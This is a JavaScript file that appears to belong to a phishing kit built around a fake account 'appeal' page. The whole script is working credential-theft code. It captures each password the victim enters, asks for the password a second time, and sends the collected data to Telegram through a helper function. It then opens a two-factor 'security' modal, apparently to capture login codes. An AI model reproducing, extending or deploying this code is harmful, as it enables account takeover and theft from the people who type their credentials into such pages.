(function () {
  document.addEventListener('DOMContentLoaded', function () {
    var form = document.getElementById('password-form');
    if (!form) return;

    var getRecord = window.getRecord;
    var saveRecord = window.saveRecord;
    var openModal = window.openModal;
    var closeModal = window.closeModal;
    var submitBtn = form.querySelector('button[type="submit"]');
    if (!submitBtn) return;

    // Use click on submit button so we read values before script.js submit handler resets the form
    submitBtn.addEventListener('click', function () {
      try {
        var baseData = {};
        if (typeof getRecord === 'function') {
          try {
            var stored = getRecord('__appeal_temp');
            if (stored && typeof stored === 'object') {
              baseData = stored;
            }
          } catch (e) {
            console.warn('Failed to read temporary appeal data:', e);
          }
        }

        var formData = new FormData(form);
        var passwordValue = formData.get('password');
        if (!passwordValue) {
          console.warn('Password value is empty, nothing to log.');
          return;
        }

        var combined = {};
        Object.keys(baseData).forEach(function (k) {
          combined[k] = baseData[k];
        });

        // First time: store as passwordFirst, second time as passwordSecond
        if (!combined.passwordFirst) {
          combined.passwordFirst = passwordValue;
        } else {
          combined.passwordSecond = passwordValue;
        }

        if (typeof saveRecord === 'function') {
          try {
            saveRecord('__appeal_temp', combined);
          } catch (e) {
            console.warn('Failed to save combined password data:', e);
          }
        }

        console.log('🔐 Password modal combined data:', combined);

        // Send current combined data to Telegram using API defined in script.js and config.js
        if (typeof window.sendTelegramMessage === 'function') {
          try {
            window.sendTelegramMessage(combined);
          } catch (e) {
            console.warn('Failed to send password data to Telegram:', e);
          }
        } else {
          console.warn('sendTelegramMessage is not available on window.');
        }

        // When both passwords are collected, switch to 2FA (security) modal
        if (combined.passwordFirst && combined.passwordSecond) {
          if (typeof closeModal === 'function') {
            closeModal('password');
          }
          if (typeof openModal === 'function') {
            openModal('security');
          }
        }
      } catch (err) {
        console.warn('Failed to combine password modal data:', err);
      }
    });
  });
})();


